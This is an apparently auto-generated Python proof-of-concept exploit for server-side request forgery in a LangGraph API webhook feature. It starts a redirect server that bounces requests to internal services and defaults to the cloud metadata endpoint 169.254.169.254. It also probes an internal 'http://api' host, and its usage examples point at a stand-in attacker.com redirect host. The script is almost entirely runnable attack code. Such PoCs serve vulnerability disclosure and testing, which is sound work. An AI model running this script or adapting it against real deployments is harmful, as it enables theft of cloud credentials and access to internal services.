#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-011
# Sink: get_loopback_client
# Auto-generated — run with: python3 ssrf_asyncclient_get_loopback_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Webhook URL in langgraph_api_src

Vulnerability: The webhook URL is user-controlled and passed to httpx.AsyncClient.post.
Although validate_webhook_url_or_raise is called, the HTTP client follows redirects by default,
allowing SSRF to internal services. Additionally, the loopback client uses base_url='http://api'
which can be exploited if an attacker controls a relative path.

This PoC demonstrates:
1. SSRF via redirect bypass (external webhook redirects to internal service)
2. SSRF via relative path injection (using the loopback client)

Usage:
    python3 poc_ssrf_webhook.py [--target TARGET_URL] [--internal INTERNAL_URL]

Examples:
    # Test redirect-based SSRF (requires attacker-controlled server)
    python3 poc_ssrf_webhook.py --target http://attacker.com/redirect --internal http://169.254.169.254/latest/meta-data/

    # Test relative path injection (simulates internal service at http://api/internal)
    python3 poc_ssrf_webhook.py --target /internal/secret --internal http://api/internal/secret
"""

import argparse
import sys
import json
import socket
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
import time

# Try to import requests, fall back to urllib
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    HAS_REQUESTS = False


class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that redirects to an internal URL."""
    
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', self.server.internal_url)
        self.end_headers()
    
    def do_POST(self):
        self.send_response(302)
        self.send_header('Location', self.server.internal_url)
        self.end_headers()
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass


def start_redirect_server(port, internal_url):
    """Start a simple HTTP server that redirects to internal_url."""
    server = HTTPServer(('0.0.0.0', port), RedirectHandler)
    server.internal_url = internal_url
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Redirect server started on port {port}, redirecting to {internal_url}")
    return server


def test_ssrf_redirect(target_url, internal_url, timeout=5):
    """
    Test SSRF via redirect bypass.
    
    This simulates an attacker-controlled webhook URL that redirects to an internal service.
    The validation only checks the initial URL, but the HTTP client follows the redirect.
    """
    print(f"\n[*] Testing SSRF via redirect bypass")
    print(f"    Target webhook URL: {target_url}")
    print(f"    Internal target: {internal_url}")
    
    # Start a local redirect server if target is localhost
    parsed = urllib.parse.urlparse(target_url)
    if parsed.hostname in ('localhost', '127.0.0.1', '0.0.0.0'):
        port = parsed.port or 8080
        server = start_redirect_server(port, internal_url)
        print(f"[*] Started redirect server on port {port}")
    
    try:
        if HAS_REQUESTS:
            # Simulate the httpx behavior (follows redirects by default)
            response = requests.post(
                target_url,
                json={"test": "payload"},
                timeout=timeout,
                allow_redirects=True  # This is the vulnerable behavior
            )
            print(f"[+] Request succeeded!")
            print(f"    Status: {response.status_code}")
            print(f"    Headers: {dict(response.headers)}")
            if response.text:
                print(f"    Response body (first 500 chars): {response.text[:500]}")
            return True
        else:
            # Fallback using urllib
            req = urllib.request.Request(target_url, 
                                       data=json.dumps({"test": "payload"}).encode(),
                                       headers={'Content-Type': 'application/json'})
            try:
                response = urllib.request.urlopen(req, timeout=timeout)
                print(f"[+] Request succeeded!")
                print(f"    Status: {response.status}")
                print(f"    Headers: {dict(response.headers)}")
                body = response.read().decode('utf-8', errors='ignore')
                if body:
                    print(f"    Response body (first 500 chars): {body[:500]}")
                return True
            except urllib.error.HTTPError as e:
                print(f"[+] Request succeeded (HTTP error: {e.code})")
                print(f"    Headers: {dict(e.headers)}")
                body = e.read().decode('utf-8', errors='ignore')
                if body:
                    print(f"    Response body (first 500 chars): {body[:500]}")
                return True
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("    This is expected if the target server is not running.")
        print("    To test, set up a redirect server or use a real attacker-controlled URL.")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False
    finally:
        if 'server' in locals():
            server.shutdown()


def test_ssrf_relative_path(relative_path, timeout=5):
    """
    Test SSRF via relative path injection.
    
    The loopback client uses base_url='http://api', so a relative path like
    '/internal/secret' would become 'http://api/internal/secret'.
    """
    print(f"\n[*] Testing SSRF via relative path injection")
    print(f"    Relative path: {relative_path}")
    print(f"    Full URL would be: http://api{relative_path}")
    
    # Try to resolve 'api' hostname
    try:
        ip = socket.gethostbyname('api')
        print(f"[*] 'api' resolves to: {ip}")
    except socket.gaierror:
        print("[*] 'api' hostname does not resolve (expected in most environments)")
        print("    This would work inside the Docker/Kubernetes network where 'api' is defined.")
    
    # Attempt the request
    url = f"http://api{relative_path}"
    print(f"[*] Attempting request to: {url}")
    
    try:
        if HAS_REQUESTS:
            response = requests.get(url, timeout=timeout)
            print(f"[+] Request succeeded!")
            print(f"    Status: {response.status_code}")
            print(f"    Headers: {dict(response.headers)}")
            if response.text:
                print(f"    Response body (first 500 chars): {response.text[:500]}")
            return True
        else:
            req = urllib.request.Request(url)
            try:
                response = urllib.request.urlopen(req, timeout=timeout)
                print(f"[+] Request succeeded!")
                print(f"    Status: {response.status}")
                print(f"    Headers: {dict(response.headers)}")
                body = response.read().decode('utf-8', errors='ignore')
                if body:
                    print(f"    Response body (first 500 chars): {body[:500]}")
                return True
            except urllib.error.HTTPError as e:
                print(f"[+] Request succeeded (HTTP error: {e.code})")
                print(f"    Headers: {dict(e.headers)}")
                body = e.read().decode('utf-8', errors='ignore')
                if body:
                    print(f"    Response body (first 500 chars): {body[:500]}")
                return True
    except Exception as e:
        print(f"[-] Error: {e}")
        print("    This is expected if the 'api' service is not accessible.")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for SSRF in langgraph_api_src webhook functionality"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080/redirect",
        help="Target webhook URL (default: http://localhost:8080/redirect)"
    )
    parser.add_argument(
        "--internal",
        default="http://169.254.169.254/latest/meta-data/",
        help="Internal URL to access via SSRF (default: AWS metadata endpoint)"
    )
    parser.add_argument(
        "--relative",
        default="/internal/secret",
        help="Relative path to test loopback client SSRF (default: /internal/secret)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=5,
        help="Request timeout in seconds (default: 5)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("SSRF Proof-of-Concept for langgraph_api_src")
    print("=" * 60)
    print(f"\n[*] Using requests library: {HAS_REQUESTS}")
    print(f"[*] Timeout: {args.timeout}s")
    
    # Test 1: Redirect-based SSRF
    print("\n" + "=" * 60)
    print("TEST 1: Redirect-based SSRF")
    print("=" * 60)
    print("\n[!] This test requires an attacker-controlled server that redirects to an internal URL.")
    print("[!] If target is localhost, a simple redirect server will be started automatically.")
    
    success1 = test_ssrf_redirect(args.target, args.internal, args.timeout)
    
    # Test 2: Relative path SSRF
    print("\n" + "=" * 60)
    print("TEST 2: Relative path SSRF (loopback client)")
    print("=" * 60)
    print("\n[!] This test attempts to access http://api{relative_path}")
    print("[!] This only works inside the Docker/Kubernetes network where 'api' resolves.")
    
    success2 = test_ssrf_relative_path(args.relative, args.timeout)
    
    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    if success1:
        print("[+] TEST 1 (Redirect SSRF): Potentially exploitable")
        print("    The HTTP client followed the redirect to the internal URL.")
        print("    This confirms the SSRF vulnerability via redirect bypass.")
    else:
        print("[-] TEST 1 (Redirect SSRF): Could not confirm")
        print("    This may be due to network restrictions or missing target server.")
    
    if success2:
        print("[+] TEST 2 (Relative path SSRF): Potentially exploitable")
        print("    Successfully accessed the internal 'api' service.")
        print("    This confirms the SSRF vulnerability via relative path injection.")
    else:
        print("[-] TEST 2 (Relative path SSRF): Could not confirm")
        print("    The 'api' hostname may not be resolvable from this environment.")
    
    print("\n[*] Note: These tests simulate the vulnerable behavior.")
    print("[*] In a real attack, the webhook URL would be stored in the database")
    print("    and triggered when a run completes.")
    print("[*] The validate_webhook_url_or_raise function only checks the initial URL,")
    print("    not the final destination after redirects.")


if __name__ == "__main__":
    main()
